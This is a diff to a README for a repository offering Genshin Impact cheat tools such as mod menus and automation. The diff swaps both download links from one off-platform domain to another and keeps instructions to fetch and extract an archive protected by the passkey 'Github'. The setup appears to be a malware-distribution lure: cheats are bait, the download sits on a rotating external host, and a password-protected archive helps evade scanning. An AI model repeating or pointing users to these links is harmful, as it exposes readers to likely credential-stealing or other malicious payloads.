@@ -9,7 +9,7 @@ A collection of open-source tools for Genshin Impact — mod menus, automation b
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -84,7 +84,7 @@ These tools are for research and educational purposes only.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Extract the archive.
 
